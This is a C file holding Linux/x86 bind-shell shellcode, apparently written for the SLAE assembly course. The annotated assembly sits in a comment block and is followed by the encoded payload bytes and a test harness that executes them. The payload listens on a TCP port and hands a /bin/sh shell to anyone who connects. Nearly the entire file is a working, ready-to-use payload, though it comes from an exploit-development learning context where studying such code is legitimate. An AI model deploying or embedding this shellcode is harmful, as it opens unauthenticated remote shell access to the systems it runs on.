#include<stdio.h>
#include<string.h>

/*

; Bind TCP Shellcode
; Copyright 2018, Luca Di Domenico
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.

; Title:     Linux/x86 - TCP bind shell
; Author:    Luca Di Domenico
; Website:   https://thehackeradventure.com
; Blog post: https://thehackeradventure.com/2018/05/17/assignement1/
; Twitter:    @sudo45
; SLAE-ID:    1245

global _start

section .text
_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

; socket()

	push eax
	mov al, 0x66
	mov bl, 0x1
	mov cl, 0x2
	push ebx
	push ecx
	lea ecx, [esp]
	int 0x80

; bind()

	pop ecx
	pop ebx
	push word 0xb315
	push word cx
	mov ecx, esp
	mov dl, 0x10
	push edx
	push ecx
	push eax
	xchg eax, edx
	mov al, 0x66
	mov bl, 0x2
	mov ecx, esp
	int 0x80

; listen()

	push eax
	push edx
	mov al, 0x66
	mov bl, 0x4
	mov ecx, esp
	mov edx, eax
	int 0x80

; accept()

	xchg eax, edx
	pop edi
	push edx
	push edi
	inc ebx
	mov ecx, esp
	int 0x80
	xchg ebx, eax
	xor ecx, ecx
	mov cl, 0x2

_dup2_loop:

	mov al, 0x3f
	int 0x80
	dec ecx
	jns _dup2_loop

; execve()

	xor ecx, ecx
	push ecx     ; 0x00
	push 0x68732f2f	; hs//
	push 0x6e69622f	; nib/
	mov ebx, esp
	mov al, 0xb
	int 0x80

*/

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\xb0\x66\xb3\x01\xb1\x02\x53\x51\x8d\x0c\x24\xcd\x80\x59\x5b\x66\x68\x15\xb3\x66\x51\x89\xe1\xb2\x10\x52\x51\x50\x92\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x50\x52\xb0\x66\xb3\x04\x89\xe1\x89\xc2\xcd\x80\x92\x5f\x52\x57\x43\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}